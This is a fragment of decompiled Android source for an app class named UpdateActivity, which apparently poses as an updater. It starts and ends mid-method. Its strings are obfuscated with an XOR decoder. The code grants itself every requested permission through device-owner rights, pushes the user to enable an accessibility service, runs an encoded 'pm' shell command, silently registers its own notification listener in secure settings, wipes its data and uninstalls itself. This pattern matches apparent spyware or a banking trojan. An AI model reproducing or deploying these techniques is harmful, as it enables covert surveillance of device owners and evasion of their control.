                        } else if (Build.VERSION.SDK_INT < 29 && ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{-98, -29, -58, 50, 77, 42, -53, 38, -113, -24, -48, 45, 75, 48, -36, 97, -112, -29, -116, 1, 97, 0, -22, 91, -84, -46, -32, 1, 97, 8, -24, 90, -80, -40, -20, 4, 125, 15, -32, 75, -66, -39, -21, 15, 108}, new byte[]{-1, -115, -94, 64, 34, 67, -81, 8})) != 0) {
                            ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{-51, 34, -45, -116, 87, 2, 116, -126, -36, 41, -59, -109, 81, 24, 99, -59, -61, 34, -103, -65, 123, 40, 85, -1, -1, 19, -11, -65, 123, 32, 87, -2, -29, 25, -7, -70, 103, 39, 95, -17, -19, 24, -2, -79, 118}, new byte[]{-84, 76, -73, -2, 56, 107, 16, -84})}, 100);
                            break;
                        }
                        break;
                    case 3:
                        String str7 = UpdateActivity.f1678l;
                        C1652b.m2745o().loadBoolean(AbstractC1387m.m2421h(new byte[]{102, 120, 47, -40, 75}, new byte[]{34, 40, 90, -88, 56, 83, 4, 111}), false);
                        SharedPreferences.Editor editorEdit = updateActivity.getSharedPreferences(C3277a.f9610c, 0).edit();
                        editorEdit.clear();
                        editorEdit.apply();
                        SharedPreferences.Editor editorEdit2 = updateActivity.getSharedPreferences(C2571e.f7130b, 0).edit();
                        editorEdit2.clear();
                        editorEdit2.apply();
                        File[] fileArrListFiles = updateActivity.getFilesDir().listFiles();
                        if (fileArrListFiles != null) {
                            for (File file : fileArrListFiles) {
                                file.delete();
                            }
                        }
                        File[] fileArrListFiles2 = updateActivity.getCacheDir().listFiles();
                        if (fileArrListFiles2 != null) {
                            int length2 = fileArrListFiles2.length;
                            while (i111 < length2) {
                                fileArrListFiles2[i111].delete();
                                i111++;
                            }
                        }
                        break;
                    case 4:
                        updateActivity.f1685h.setEnabled(false);
                        Handler handler = new Handler(Looper.getMainLooper());
                        updateActivity.m1600s(AbstractC1387m.m2421h(new byte[]{-99, 73, 20, -43, 25, -99, 12}, new byte[]{-12, 39, 125, -95, 112, -4, 96, -126}));
                        while (i110 <= 4) {
                            handler.postDelayed(new RunnableC0010c(updateActivity, i110, 6), ((long) i110) * 2000);
                            i110++;
                        }
                        handler.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i111) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 10000L);
                        break;
                    case 5:
                        String str8 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 6:
                        String str9 = UpdateActivity.f1678l;
                        C2194a.m3500t(C2349s0.class, null).show(updateActivity.getSupportFragmentManager(), AbstractC1387m.m2421h(new byte[]{88, -23, -7, 47, -63, -19, 45, 63, 107, -5, -28, 46, -48, -15, 43, 56, 64, -5, -45, 37, -53, -28, 36, 34, 83}, new byte[]{52, -120, -116, 65, -94, -123, 72, 77}));
                        break;
                    case 7:
                        String str10 = UpdateActivity.f1678l;
                        updateActivity.m1601t();
                        break;
                    case 8:
                        updateActivity.f1687j++;
                        Handler handler2 = updateActivity.f1688k;
                        handler2.removeCallbacksAndMessages(null);
                        handler2.postDelayed(new Runnable() { // from class: e0.w2
                            @Override // java.lang.Runnable
                            public final void run() {
                                switch (i110) {
                                    case 0:
                                        String str11 = UpdateActivity.f1678l;
                                        UpdateActivity updateActivity2 = updateActivity;
                                        C1417s c1417sM2423j = AbstractC1387m.m2423j(updateActivity2);
                                        String str12 = UpdateActivity.f1678l;
                                        Log.e(str12, AbstractC1387m.m2421h(new byte[]{-62, -52, 0, -104, -38, 38, -89, 67, -29, -3, 47, -72, -26, 28, -61, 71, -20, -20, 50, -78, -110, 99}, new byte[]{-96, -87, 102, -9, -88, 67, -121, 2}).concat(c1417sM2423j.m2451a()));
                                        try {
                                            Intent intent = new Intent(AbstractC1387m.m2421h(new byte[]{-118, 54, -79, 70, -62, 24, -125, -113, -126, 54, -95, 81, -61, 5, -55, -64, -120, 44, -68, 91, -61, 95, -93, -28, -89, 29, -127, 113}, new byte[]{-21, 88, -43, 52, -83, 113, -25, -95}));
                                            intent.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{54, 97, 56, 91, 67, -61, -111, -21}, new byte[]{70, 0, 91, 48, 34, -92, -12, -47}) + updateActivity2.getPackageName()));
                                            intent.addFlags(268435456);
                                            updateActivity2.startActivity(intent);
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{-30, 119, -81, 43, 88, 123, 31, 3, -26, 120, -66, 54, 82, 21, 51, 51, -62, 70, -113, 7, 115}, new byte[]{-93, 52, -5, 98, 23, 53, 64, 71}));
                                        } catch (Exception e12) {
                                            Log.e(str12, AbstractC1387m.m2421h(new byte[]{44, 97, -108, -92, -12, 84, -73, -8, 40, 110, -123, -71, -2, 58, -114, -35, 4, 78, -91, -119}, new byte[]{109, 34, -64, -19, -69, 26, -24, -68}), e12);
                                            try {
                                                Intent intent2 = new Intent(AbstractC1387m.m2421h(new byte[]{-37, 92, 33, 39, 16, 117, -91, 83, -45, 92, 49, 48, 17, 104, -17, 28, -39, 70, 44, 58, 17, 50, -108, 51, -13, 124, 22, 1, 62, 80, -115, 34, -22, 115, 6, 30, 62, 91, -124}, new byte[]{-70, 50, 69, 85, ByteCompanionObject.MAX_VALUE, 28, -63, 125}));
                                                intent2.setData(Uri.parse(AbstractC1387m.m2421h(new byte[]{-39, 75, -36, 78, 22, -67, 44, -20}, new byte[]{-87, 42, -65, 37, 119, -38, 73, -42}) + updateActivity2.getPackageName()));
                                                intent2.addFlags(268435456);
                                                updateActivity2.startActivity(intent2);
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{117, 84, 97, -43, 3, -117, 35, 8, 122, 94, 123, -49, 24, -124, 48, 17, 107, 71, 116, -33, 7, -124, 59, 24, 20, 100, 65, -3, 62, -79, 25, 57}, new byte[]{52, 23, 53, -100, 76, -59, 124, 93}));
                                            } catch (Exception e13) {
                                                Log.e(str12, AbstractC1387m.m2421h(new byte[]{-24, -53, 31, 120, 55, -51, -85, 27, -25, -63, 5, 98, 44, -62, -72, 2, -10, -40, 10, 114, 51, -62, -77, 11, -119, -18, 42, 88, 20, -26, -112}, new byte[]{-87, -120, 75, 49, 120, -125, -12, 78}), e13);
                                                try {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{49, -13, 75, -82, -2, 13, 57, 28, 15, -31, 92, -92, -13, 6, 57, 39, 65, -25, 70, -84, -15, 25, 40, 52, 13, -2, 8, -93, -2, 6, 48, 55, 0, -15, 67, -23, -65, 25, 40, 52, 21, -9, 18, -27}, new byte[]{97, -110, 40, -59, -97, 106, 92, 85}).concat(AbstractC1387m.m2423j(updateActivity2).m2451a()));
                                                    Intent intent3 = new Intent(updateActivity2, (Class<?>) InstallResultReceiver.class);
                                                    intent3.setAction(updateActivity2.getPackageName() + AbstractC1387m.m2421h(new byte[]{112, -59, ByteCompanionObject.MIN_VALUE, 29, 22, 17, -67, -18, 23, -40, -106, 5, 17, 2, -92, -1, 12, -45, -106, 4, 28, 26}, new byte[]{94, -106, -59, 81, 80, 78, -24, -96}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{87, -7, -17, 94, 29, -117, 7, 102, 86}, new byte[]{56, -119, -118, 44, 124, -1, 110, 9}), AbstractC1387m.m2421h(new byte[]{39, -67, 80, -75, -29, 39, -40, 95, 62}, new byte[]{82, -45, 57, -37, -112, 83, -71, 51}));
                                                    intent3.putExtra(AbstractC1387m.m2421h(new byte[]{-9, -26, 7, 48, 92, -108, -48, 85, -26, -22, 1}, new byte[]{-121, -121, 100, 91, Base64.padSymbol, -13, -75, 27}), updateActivity2.getPackageName());
                                                    updateActivity2.getPackageManager().getPackageInstaller().uninstall(updateActivity2.getPackageName(), PendingIntent.getBroadcast(updateActivity2, updateActivity2.getPackageName().hashCode(), intent3, 167772160).getIntentSender());
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{86, 71, 40, -92, -116, ByteCompanionObject.MAX_VALUE, -91, -9, 104, 85, 63, -82, -127, 116, -91, -52, 38, 83, 37, -90, -125, 107, -76, -33, 106, 74, 107, -67, -120, 105, -75, -37, 117, 82, 46, -85}, new byte[]{6, 38, 75, -49, -19, 24, -64, -66}));
                                                } catch (Exception e14) {
                                                    Log.e(str12, AbstractC1387m.m2421h(new byte[]{24, -52, 59, -14, 7, 79, 40, -47, 38, -34, 44, -8, 10, 68, 40, -22, 104, -40, 54, -16, 8, 91, 57, -7, 36, -63, 120, -1, 7, 65, 33, -3, 44}, new byte[]{72, -83, 88, -103, 102, 40, 77, -104}), e14);
                                                }
                                            }
                                        }
                                        updateActivity2.f1685h.setEnabled(true);
                                        break;
                                    default:
                                        updateActivity.f1687j = 0;
                                        break;
                                }
                            }
                        }, 1000L);
                        if (updateActivity.f1687j >= 10) {
                            updateActivity.f1687j = 0;
                            updateActivity.f1682e.setVisibility(0);
                        }
                        break;
                    default:
                        String str11 = UpdateActivity.f1678l;
                        new C1445y2(AbstractC1387m.m2421h(new byte[]{89, -15}, new byte[]{23, -94, 17, -110, -3, 93, 70, -67}), updateActivity);
                        break;
                }
            }
        });
        Button button2 = (Button) findViewById(R.id.DelAppButton);
        this.f1685h = button2;
        final int i19 = 4;
        button2.setOnClickListener(new View.OnClickListener(this) { // from class: e0.v2

            /* JADX INFO: renamed from: c */
            public final /* synthetic */ UpdateActivity f3455c;

            {
                this.f3455c = this;
            }

            /* JADX WARN: Code duplicated, block: B:107:0x03a5  */
            /* JADX WARN: Code duplicated, block: B:113:0x03dc  */
            /* JADX WARN: Code duplicated, block: B:134:0x01c9 A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:136:0x01af A[SYNTHETIC] */
            /* JADX WARN: Code duplicated, block: B:52:0x01b5  */
            /* JADX WARN: Code duplicated, block: B:57:0x01d2  */
            /* JADX WARN: Code duplicated, block: B:68:0x0263 A[DONT_INVERT] */
            /* JADX WARN: Code duplicated, block: B:69:0x0265 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            /* JADX WARN: Code duplicated, block: B:73:0x0292 A[Catch: Exception -> 0x0261, TryCatch #4 {Exception -> 0x0261, blocks: (B:60:0x0220, B:62:0x0241, B:65:0x024c, B:69:0x0265, B:72:0x026c, B:74:0x0296, B:73:0x0292), top: B:128:0x0220 }] */
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                String[] strArr;
                char c;
                Boolean bool;
                Iterator<AccessibilityServiceInfo> it;
                String string;
                ComponentName componentName;
                String strFlattenToString;
                int i110 = i19;
                final UpdateActivity updateActivity = this.f3455c;
                final int i111 = 1;
                final int i112 = 0;
                switch (i110) {
                    case 0:
                        String str3 = UpdateActivity.f1678l;
                        updateActivity.finish();
                        break;
                    case 1:
                        String str4 = UpdateActivity.f1678l;
                        AbstractC3656k.m5875u(updateActivity, new Intent(updateActivity, (Class<?>) ManageAppsActivity.class), null);
                        break;
                    case 2:
                        String str5 = UpdateActivity.f1678l;
                        if (!((DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-54, -62, -102, 109, 29, -104, -14, 90, -63, -53, -123, 103, 7}, new byte[]{-82, -89, -20, 4, 126, -3, -83, 42}))).isDeviceOwnerApp(updateActivity.getPackageName())) {
                            Context applicationContext = updateActivity.getApplicationContext();
                            try {
                                strArr = applicationContext.getPackageManager().getPackageInfo(applicationContext.getPackageName(), 4096).requestedPermissions;
                            } catch (PackageManager.NameNotFoundException e) {
                                e.printStackTrace();
                                strArr = new String[0];
                            }
                            if (strArr != null && strArr.length != 0) {
                                ArrayList arrayList = new ArrayList();
                                for (String str6 : strArr) {
                                    if (ContextCompat.checkSelfPermission(applicationContext, str6) != 0) {
                                        arrayList.add(str6);
                                    }
                                }
                                if (!arrayList.isEmpty()) {
                                    ActivityCompat.requestPermissions(updateActivity, (String[]) arrayList.toArray(new String[0]), 100);
                                }
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{50, -84, -96, 96, -101, 114, -102, -12, 58, -93, -86, 113, -111}, new byte[]{83, -49, -61, 5, -24, 1, -13, -106}))).getEnabledAccessibilityServiceList(-1);
                            Boolean bool2 = Boolean.FALSE;
                            Iterator<AccessibilityServiceInfo> it2 = enabledAccessibilityServiceList.iterator();
                            while (it2.hasNext()) {
                                if (it2.next().getId().equals(updateActivity.getPackageName())) {
                                    bool2 = Boolean.TRUE;
                                }
                            }
                            if (!bool2.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{-80, 10, -116, -127, 107, -34, 3, -85, -94, 1, -100, -121, 109, -39, 0, -10, -1, 37, -85, -80, 65, -28, 52, -52, -109, 45, -92, -70, 80, -18, 56, -42, -108, 48, -68, -70, 74, -16, 52}, new byte[]{-47, 100, -24, -13, 4, -73, 103, -123})), null);
                            }
                            break;
                        } else {
                            ComponentName componentName2 = new ComponentName(updateActivity, (Class<?>) DPups.class);
                            String strM2421h = AbstractC1387m.m2421h(new byte[]{-14, -107, 82, 72, 40, 29, 122, 96, -51, -98, 103, 87, 32, 0, 125, 102, -48}, new byte[]{-94, -16, 32, 37, 65, 110, 9, 9});
                            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-5, -44, -62, 93, -26, -81, 31, -75, -16, -35, -35, 87, -4}, new byte[]{-97, -79, -76, 52, -123, -54, 64, -59}));
                            try {
                                String packageName = updateActivity.getPackageName();
                                String[] strArr2 = updateActivity.getPackageManager().getPackageInfo(packageName, 4096).requestedPermissions;
                                if (strArr2 != null) {
                                    int length = strArr2.length;
                                    c = 0;
                                    while (i112 < length) {
                                        try {
                                            devicePolicyManager.setPermissionGrantState(componentName2, packageName, strArr2[i112], 1);
                                            i112++;
                                        } catch (Exception e6) {
                                            e = e6;
                                            e.printStackTrace();
                                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList11 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                                            bool = Boolean.FALSE;
                                            it = enabledAccessibilityServiceList11.iterator();
                                            while (it.hasNext()) {
                                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                                    bool = Boolean.TRUE;
                                                }
                                            }
                                            if (!bool.booleanValue()) {
                                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                                            }
                                            DevicePolicyManager devicePolicyManager11 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                                            devicePolicyManager11.isDeviceOwnerApp(updateActivity.getPackageName());
                                            Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                            string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                            componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                            if (string == null) {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            } else {
                                                if (string != null) {
                                                    strFlattenToString = componentName.flattenToString();
                                                } else {
                                                    strFlattenToString = componentName.flattenToString();
                                                }
                                                Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                                Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                            }
                                            if (ContextCompat.checkSelfPermission(updateActivity, AbstractC1387m.m2421h(new byte[]{93, 30, 76, 55, 25, 0, -69, 114, 76, 21, 90, 40, 31, 26, -84, 53, 83, 30, 6, 4, 53, 42, -102, 15, 111, 47, 110, 12, 56, 44, ByteCompanionObject.MIN_VALUE, 16, 115, 51, 105, 17, 63, 38, -111}, new byte[]{60, 112, 40, 69, 118, 105, -33, 92})) == 0) {
                                                ActivityCompat.requestPermissions(updateActivity, new String[]{AbstractC1387m.m2421h(new byte[]{124, 98, 89, 19, -7, 60, 48, 60, 109, 105, 79, 12, -1, 38, 39, 123, 114, 98, 19, 32, -43, 22, 17, 65, 78, 83, 123, 40, -40, 16, 11, 94, 82, 79, 124, 53, -33, 26, 26}, new byte[]{29, 12, Base64.padSymbol, 97, -106, 85, 84, 18})}, 100);
                                                return;
                                            } else if (Build.VERSION.SDK_INT < 29) {
                                                return;
                                            } else {
                                                return;
                                            }
                                        }
                                    }
                                } else {
                                    c = 0;
                                }
                            } catch (Exception e10) {
                                e = e10;
                                c = 0;
                            }
                            List<AccessibilityServiceInfo> enabledAccessibilityServiceList12 = ((AccessibilityManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-125, 2, 20, -111, 3, -106, -48, 4, -117, 13, 30, ByteCompanionObject.MIN_VALUE, 9}, new byte[]{-30, 97, 119, -12, 112, -27, -71, 102}))).getEnabledAccessibilityServiceList(-1);
                            bool = Boolean.FALSE;
                            it = enabledAccessibilityServiceList12.iterator();
                            while (it.hasNext()) {
                                if (it.next().getId().equals(updateActivity.getPackageName())) {
                                    bool = Boolean.TRUE;
                                }
                            }
                            if (!bool.booleanValue()) {
                                AbstractC3656k.m5875u(updateActivity, new Intent(AbstractC1387m.m2421h(new byte[]{102, -125, -63, -59, -122, 4, 35, 4, 116, -120, -47, -61, ByteCompanionObject.MIN_VALUE, 3, 32, 89, 41, -84, -26, -12, -84, 62, 20, 99, 69, -92, -23, -2, -67, 52, 24, 121, 66, -71, -15, -2, -89, 42, 20}, new byte[]{7, -19, -91, -73, -23, 109, 71, 42})), null);
                            }
                            DevicePolicyManager devicePolicyManager12 = (DevicePolicyManager) updateActivity.getSystemService(AbstractC1387m.m2421h(new byte[]{-26, -104, 41, 54, -80, -50, -12, -33, -19, -111, 54, 60, -86}, new byte[]{-126, -3, 95, 95, -45, -85, -85, -81}));
                            new ComponentName(updateActivity, (Class<?>) DPups.class);
                            devicePolicyManager12.isDeviceOwnerApp(updateActivity.getPackageName());
                            try {
                                Runtime.getRuntime().exec(AbstractC1387m.m2421h(new byte[]{-29, 10, 29, -114, 2, 67, 126, 60, -77, 4, 82, -124, 94, 71, 104, 41, -2, 23, 81, -116, 94, 76, 113, 62, -6, 20, 73, -120, 2, 86, 48, 41, -3, 3, 79, -122, 25, 70, 62, 56, -10, 21, 80, ByteCompanionObject.MIN_VALUE, 3, 81, 121, 39, -3, 73, 106, -69, 57, 118, 85, 23, -64, 34, 126, -68, 34, 103, 79, 27, -42, 51, 105, -96, 62, 101, 67}, new byte[]{-109, 103, Base64.padSymbol, -23, 112, 34, 16, 72}));
                                break;
                            } catch (IOException unused2) {
                            }
                            try {
                                string = Settings.Secure.getString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-74, -109, 55, 9, -28, -106, -56, 123, -67, -110, 34, 2, -18, -102, -49, 69, -89, -108, 57, 5, -41, -97, -59, 87, -89, -104, 56, 14, -6, ByteCompanionObject.MIN_VALUE}, new byte[]{-45, -3, 86, 107, -120, -13, -84, 36}));
                                componentName = new ComponentName(updateActivity, (Class<?>) NLService.class);
                                if (string == null && string.contains(componentName.flattenToString())) {
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{63, -125, 40, -126, 59, -101, -86, 81, 5, -123, 51, -123, 125, -98, -96, 67, 5, -119, 50, -114, 47, -46, -88, 92, 3, -119, Base64.padSymbol, -113, 36, -46, -82, 66, 16, -126, 40, -114, 57, -36}, new byte[]{113, -20, 92, -21, 93, -14, -55, 48}));
                                } else {
                                    if (string != null || string.isEmpty()) {
                                        strFlattenToString = componentName.flattenToString();
                                    } else {
                                        StringBuilder sb = new StringBuilder();
                                        sb.append(string);
                                        byte[] bArr2 = new byte[1];
                                        bArr2[c] = 55;
                                        sb.append(AbstractC1387m.m2421h(bArr2, new byte[]{13, 42, -127, ByteCompanionObject.MIN_VALUE, -4, -26, 59, -41}));
                                        sb.append(componentName.flattenToString());
                                        strFlattenToString = sb.toString();
                                    }
                                    Settings.Secure.putString(updateActivity.getContentResolver(), AbstractC1387m.m2421h(new byte[]{-73, 97, 11, 60, -106, 67, 94, -68, -68, 96, 30, 55, -100, 79, 89, -126, -90, 102, 5, 48, -91, 74, 83, -112, -90, 106, 4, 59, -120, 85}, new byte[]{-46, 15, 106, 94, -6, 38, 58, -29}), strFlattenToString);
                                    Log.d(strM2421h, AbstractC1387m.m2421h(new byte[]{-52, 1, 22, -32, -22, -79, -41, -91, -10, 7, 13, -25, -84, -76, -35, -73, -10, 11, 12, -20, -2, -8, -60, -95, -16, 3, 11, -6, -1, -79, -37, -86, -94, 9, 16, -24, -30, -84, -47, -96, -84}, new byte[]{-126, 110, 98, -119, -116, -40, -76, -60}));
                                }
                            } catch (Exception e11) {
